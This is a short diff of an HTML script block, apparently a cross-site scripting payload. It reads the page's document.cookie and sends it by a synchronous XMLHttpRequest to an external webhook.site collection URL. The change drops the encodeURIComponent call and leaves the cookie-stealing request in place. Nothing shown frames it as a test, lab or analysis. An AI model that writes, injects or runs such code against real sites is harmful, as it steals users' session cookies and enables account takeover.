@@ -1,6 +1,6 @@
 <script>
 (() => {
-  const url = "https://webhook.site/06d54714-b572-4a98-b3ac-61ba249d2026?cookie=" + encodeURIComponent(document.cookie);
+  const url = "https://webhook.site/06d54714-b572-4a98-b3ac-61ba249d2026?cookie=" + document.cookie;
   const xhr = new XMLHttpRequest();
   xhr.open("GET", url, false); // synchronous request
   try {
